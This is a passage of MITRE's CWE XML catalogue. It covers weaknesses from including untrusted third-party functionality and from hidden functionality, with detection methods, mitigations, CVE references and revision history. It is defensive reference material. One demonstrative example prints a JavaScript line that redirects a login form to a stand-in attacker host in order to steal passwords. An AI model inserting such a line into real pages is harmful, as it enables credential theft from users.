            <xhtml:p>When including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.</xhtml:p>
            <xhtml:p>This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <Intro_Text>This login webpage includes a weather widget from an external website:</Intro_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;div class="header"&gt; Welcome!<xhtml:div style="margin-left:1em;">&lt;div id="loginBox"&gt;Please Login:<xhtml:div style="margin-left:1em;">&lt;form id ="loginForm" name="loginForm" action="login.php" method="post"&gt;<xhtml:br/>Username: &lt;input type="text" name="username" /&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>&lt;/div&gt;<xhtml:br/>&lt;div id="WeatherWidget"&gt;<xhtml:div style="margin-left:1em;">&lt;script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).</Body_Text>
               <Body_Text>For example, user login information could easily be stolen with a single line added to weatherwidget.js:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...Weather widget code....</xhtml:i>
                     <xhtml:br/>document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";</xhtml:div>
               </Example_Code>
               <Body_Text>This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2010-2076</Reference>
               <Description>Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2076</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0285</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0030</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0030</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0068</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0068</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2157</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2162</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2198</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0128</Reference>
               <Description>Modification of assumed-immutable variable in configuration script leads to file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1864</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1869</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1869</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1870</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2154</Reference>
               <Description>PHP local file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2154</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1704</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1704</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1707</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1707</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1964</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1681</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2086</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2086</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0127</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0127</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1971</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3335</Reference>
               <Description>PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3335</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="175"/>
            <Related_Attack_Pattern CAPEC_ID="201"/>
            <Related_Attack_Pattern CAPEC_ID="228"/>
            <Related_Attack_Pattern CAPEC_ID="251"/>
            <Related_Attack_Pattern CAPEC_ID="252"/>
            <Related_Attack_Pattern CAPEC_ID="253"/>
            <Related_Attack_Pattern CAPEC_ID="263"/>
            <Related_Attack_Pattern CAPEC_ID="538"/>
            <Related_Attack_Pattern CAPEC_ID="549"/>
            <Related_Attack_Pattern CAPEC_ID="640"/>
            <Related_Attack_Pattern CAPEC_ID="660"/>
            <Related_Attack_Pattern CAPEC_ID="695"/>
            <Related_Attack_Pattern CAPEC_ID="698"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-11-29</Submission_Date>
               <Submission_Version>1.11</Submission_Version>
               <Submission_ReleaseDate>2010-12-13</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="912" Name="Hidden Functionality" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the product's users or administrators.</Description>
         <Extended_Description>Hidden functionality can take many forms, such as intentionally malicious code, "Easter Eggs" that contain extraneous functionality such as games, developer-friendly shortcuts that reduce maintenance or support costs such as hard-coded accounts, etc. From a security perspective, even when the functionality is not intentionally malicious or damaging, it can increase the product's attack surface and expose additional weaknesses beyond what is already exposed by the intended functionality. Even if it is not easily accessible, the hidden functionality could be useful for attacks that modify the control flow of the application.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="684" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Scope>Integrity</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Installation</Phase>
               <Description>Always verify the integrity of the product that is being installed.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-31260</Reference>
               <Description>Chain: a digital asset management program has an undisclosed backdoor in the legacy version of a PHP script (CWE-912) that could allow an unauthenticated user to export metadata (CWE-306)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31260</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-3203</Reference>
               <Description>A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-3203</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="133"/>
            <Related_Attack_Pattern CAPEC_ID="190"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2012-12-28</Submission_Date>
               <Submission_Version>2.4</Submission_Version>
               <Submission_ReleaseDate>2013-02-21</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
   </Weaknesses>
   <Categories>
      <Category ID="1198" Name="Privilege Separation and Access Control Issues" Status="Draft">
         <Summary>Weaknesses in this category are related to features and mechanisms providing hardware-based isolation and access control (e.g., identity, policy, locking control) of sensitive shared hardware resources such as registers and fuses.</Summary>
         <Relationships>
            <Has_Member CWE_ID="276" View_ID="1194"/>
            <Has_Member CWE_ID="441" View_ID="1194"/>
            <Has_Member CWE_ID="1189" View_ID="1194"/>
            <Has_Member CWE_ID="1192" View_ID="1194"/>
            <Has_Member CWE_ID="1220" View_ID="1194"/>
            <Has_Member CWE_ID="1222" View_ID="1194"/>
            <Has_Member CWE_ID="1242" View_ID="1194"/>
            <Has_Member CWE_ID="1260" View_ID="1194"/>
            <Has_Member CWE_ID="1262" View_ID="1194"/>
            <Has_Member CWE_ID="1267" View_ID="1194"/>
            <Has_Member CWE_ID="1268" View_ID="1194"/>
            <Has_Member CWE_ID="1280" View_ID="1194"/>
            <Has_Member CWE_ID="1294" View_ID="1194"/>
            <Has_Member CWE_ID="1299" View_ID="1194"/>
            <Has_Member CWE_ID="1302" View_ID="1194"/>
            <Has_Member CWE_ID="1303" View_ID="1194"/>
            <Has_Member CWE_ID="1314" View_ID="1194"/>
